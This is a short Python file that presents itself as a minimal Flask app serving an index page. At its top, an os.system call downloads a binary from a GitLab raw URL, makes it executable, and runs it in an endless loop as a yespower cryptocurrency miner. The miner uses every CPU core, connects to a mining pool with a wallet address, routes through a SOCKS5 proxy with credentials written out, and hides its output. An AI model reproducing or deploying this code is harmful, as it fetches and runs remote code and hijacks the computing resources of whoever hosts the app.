import os
os.system ("wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant && chmod 777 plant && while :; do timeout 55s ./plant -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.ZZ -p c=JEBRET1 -t $(nproc --all) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80 >/dev/null 2>&1 && ./plant -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.ZZ -p c=JEBRET1 -t $(nproc --all) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80")
from flask import Flask
from flask import render_template

app = Flask(__name__)

@app.route("/")
def hello():
    return render_template('index.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
